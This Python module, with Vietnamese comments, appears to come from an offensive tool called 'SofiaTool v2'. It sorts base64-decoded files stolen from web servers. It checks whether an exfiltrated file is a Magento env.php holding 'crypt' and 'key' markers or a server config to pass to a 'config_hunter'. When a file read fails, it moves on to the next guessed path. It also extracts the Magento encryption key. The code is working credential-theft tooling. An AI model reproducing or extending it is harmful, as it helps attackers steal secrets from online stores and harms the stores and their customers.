"""SofiaTool v2 — path_validator: phân loại nội dung exfil về.

Sau khi decode base64, quyết định:
  - có phải env.php thật không (<?php + 'crypt'/'key')
  - hay là config (nginx/apache/php-fpm) để đưa tiếp cho config_hunter
  - hay là rác/empty → path sai, thử path kế tiếp
"""
import base64

from core.logger import get_logger

log = get_logger()

ENV_MARKERS = ("'crypt'", "'key'", "MAGENTO_ROOT", "db\"")


def classify(raw_b64):
    """Trả (kind, decoded). kind: env | config | junk | empty | decode_fail."""
    if not raw_b64:
        return "empty", ""
    try:
        decoded = base64.b64decode(raw_b64, validate=False)
    except Exception:
        return "decode_fail", ""
    try:
        text = decoded.decode("utf-8", errors="replace")
    except Exception:
        text = ""
    text = text.lstrip("\ufeff")
    if text.startswith("<?php") and any(m in text for m in ENV_MARKERS):
        return "env", text
    low = text.lower()
    if any(k in low for k in ("nginx", "httpd", "apache2", "www.conf", "fastcgi_param")):
        return "config", text
    if "<!doctype html" in low or "<html" in low:
        return "junk", text
    if len(text.strip()) < 8:
        return "empty", text
    return "unknown", text


def is_env_php(text):
    return text.startswith("<?php") and any(m in text for m in ENV_MARKERS)


def extract_key(text):
    """Lấy giá trị 'key' trong env.php, mask hiển thị (chỉ 6 ký tự đầu)."""
    import re
    m = re.search(r"'key'\s*=>\s*'([^']+)'", text)
    if not m:
        return None, None
    key = m.group(1)
    masked = key[:6] + "***" if len(key) > 6 else key + "***"
    return key, masked

